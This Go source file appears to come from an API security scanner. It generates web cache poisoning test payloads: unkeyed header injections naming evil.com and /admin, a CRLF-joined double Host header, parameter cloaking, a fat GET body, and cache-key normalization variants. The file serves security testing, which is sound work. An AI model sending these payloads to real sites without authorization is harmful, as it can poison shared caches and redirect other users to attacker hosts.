package payloads

import (
	"strings"

	"github.com/su1ph3r/indago/pkg/types"
)

// CachePoisoningGenerator generates Cache Poisoning attack payloads
type CachePoisoningGenerator struct{}

// NewCachePoisoningGenerator creates a new Cache Poisoning payload generator
func NewCachePoisoningGenerator() *CachePoisoningGenerator {
	return &CachePoisoningGenerator{}
}

// Type returns the attack type
func (g *CachePoisoningGenerator) Type() string {
	return types.AttackCachePoisoning
}

// Generate generates cache poisoning payloads for a parameter.
// Cache poisoning only applies to GET endpoints. To avoid duplicate payloads
// across parameters, payloads are only generated for the first parameter.
func (g *CachePoisoningGenerator) Generate(endpoint types.Endpoint, param *types.Parameter) []Payload {
	// Cache poisoning targets GET requests (cacheable by default)
	if strings.ToUpper(endpoint.Method) != "GET" {
		return nil
	}

	// Sentinel: only generate for the first parameter to avoid duplicates.
	// Check URL parameters first, then fall back to body fields.
	firstParam := ""
	if len(endpoint.Parameters) > 0 {
		firstParam = endpoint.Parameters[0].Name
	} else if endpoint.Body != nil && len(endpoint.Body.Fields) > 0 {
		firstParam = endpoint.Body.Fields[0].Name
	}

	if param.Name != firstParam {
		return nil
	}

	var payloads []Payload

	payloads = append(payloads, g.unkeyedHeaderPayloads()...)
	payloads = append(payloads, g.parameterCloakingPayloads()...)
	payloads = append(payloads, g.fatGETPayloads()...)
	payloads = append(payloads, g.hostHeaderPayloads()...)
	payloads = append(payloads, g.cacheKeyNormalizationPayloads()...)

	return payloads
}

// unkeyedHeaderPayloads generates payloads that inject unkeyed headers.
// These headers are often excluded from the cache key but still processed
// by the origin server, allowing an attacker to poison cached responses.
func (g *CachePoisoningGenerator) unkeyedHeaderPayloads() []Payload {
	return []Payload{
		{
			Value:       "normal",
			Type:        types.AttackCachePoisoning,
			Category:    "cache_poisoning",
			Description: "Unkeyed header: X-Forwarded-Host injection to redirect cached responses",
			Metadata:    map[string]string{"inject_header": "X-Forwarded-Host: evil.com"},
		},
		{
			Value:       "normal",
			Type:        types.AttackCachePoisoning,
			Category:    "cache_poisoning",
			Description: "Unkeyed header: X-Forwarded-Scheme downgrade to force HTTP redirect",
			Metadata:    map[string]string{"inject_header": "X-Forwarded-Scheme: http"},
		},
		{
			Value:       "normal",
			Type:        types.AttackCachePoisoning,
			Category:    "cache_poisoning",
			Description: "Unkeyed header: X-Original-URL override to access /admin via cache",
			Metadata:    map[string]string{"inject_header": "X-Original-URL: /admin"},
		},
		{
			Value:       "normal",
			Type:        types.AttackCachePoisoning,
			Category:    "cache_poisoning",
			Description: "Unkeyed header: X-Rewrite-URL override to access /admin via cache",
			Metadata:    map[string]string{"inject_header": "X-Rewrite-URL: /admin"},
		},
		{
			Value:       "normal",
			Type:        types.AttackCachePoisoning,
			Category:    "cache_poisoning",
			Description: "Unkeyed header: X-Forwarded-For to poison cache with localhost origin",
			Metadata:    map[string]string{"inject_header": "X-Forwarded-For: 127.0.0.1"},
		},
	}
}

// parameterCloakingPayloads generates payloads that exploit differences in
// how the cache and the origin server parse query parameters, allowing
// hidden parameters to be smuggled through the cache key.
func (g *CachePoisoningGenerator) parameterCloakingPayloads() []Payload {
	return []Payload{
		{
			Value:       "value&cachebuster=1",
			Type:        types.AttackCachePoisoning,
			Category:    "cache_poisoning",
			Description: "Parameter cloaking: ampersand-separated hidden parameter",
		},
		{
			Value:       "value;cachebuster=1",
			Type:        types.AttackCachePoisoning,
			Category:    "cache_poisoning",
			Description: "Parameter cloaking: semicolon-separated hidden parameter",
		},
	}
}

// fatGETPayloads generates payloads that send a body with a GET request.
// Some frameworks process the body even on GET requests, but caches
// typically ignore it, allowing the cached response to be poisoned.
func (g *CachePoisoningGenerator) fatGETPayloads() []Payload {
	return []Payload{
		{
			Value:       "{\"admin\": true}",
			Type:        types.AttackCachePoisoning,
			Category:    "cache_poisoning",
			Description: "Fat GET: body payload on GET request to poison cached response",
			Metadata:    map[string]string{"inject_body": "true"},
		},
	}
}

// hostHeaderPayloads generates payloads that manipulate the Host header.
// If the cache keys on the URL path but ignores the Host header, an
// attacker can poison responses with a malicious host.
func (g *CachePoisoningGenerator) hostHeaderPayloads() []Payload {
	return []Payload{
		{
			Value:       "normal",
			Type:        types.AttackCachePoisoning,
			Category:    "cache_poisoning",
			Description: "Host header override: replace Host to poison cached response",
			Metadata:    map[string]string{"inject_header": "Host: evil.com"},
		},
		{
			Value:       "normal",
			Type:        types.AttackCachePoisoning,
			Category:    "cache_poisoning",
			Description: "Host header override with X-Forwarded-Host double injection",
			Metadata:    map[string]string{"inject_header": "Host: evil.com\r\nX-Forwarded-Host: evil.com"},
		},
	}
}

// cacheKeyNormalizationPayloads generates payloads that exploit differences
// in URL normalization between the cache and the origin server, such as
// encoding variations, case differences, and trailing characters.
func (g *CachePoisoningGenerator) cacheKeyNormalizationPayloads() []Payload {
	return []Payload{
		{
			Value:       "%6e%6f%72%6d%61%6c",
			Type:        types.AttackCachePoisoning,
			Category:    "cache_poisoning",
			Description: "Cache key normalization: URL-encoded path variant (\"normal\" encoded)",
		},
		{
			Value:       "%4e%4f%52%4d%41%4c",
			Type:        types.AttackCachePoisoning,
			Category:    "cache_poisoning",
			Description: "Cache key normalization: uppercase URL-encoded path variant",
		},
		{
			Value:       "NORMAL",
			Type:        types.AttackCachePoisoning,
			Category:    "cache_poisoning",
			Description: "Cache key normalization: uppercase case variation",
		},
		{
			Value:       "Normal",
			Type:        types.AttackCachePoisoning,
			Category:    "cache_poisoning",
			Description: "Cache key normalization: mixed case variation",
		},
		{
			Value:       "normal.",
			Type:        types.AttackCachePoisoning,
			Category:    "cache_poisoning",
			Description: "Cache key normalization: trailing dot to bypass cache key matching",
		},
		{
			Value:       "normal/",
			Type:        types.AttackCachePoisoning,
			Category:    "cache_poisoning",
			Description: "Cache key normalization: trailing slash to bypass cache key matching",
		},
	}
}
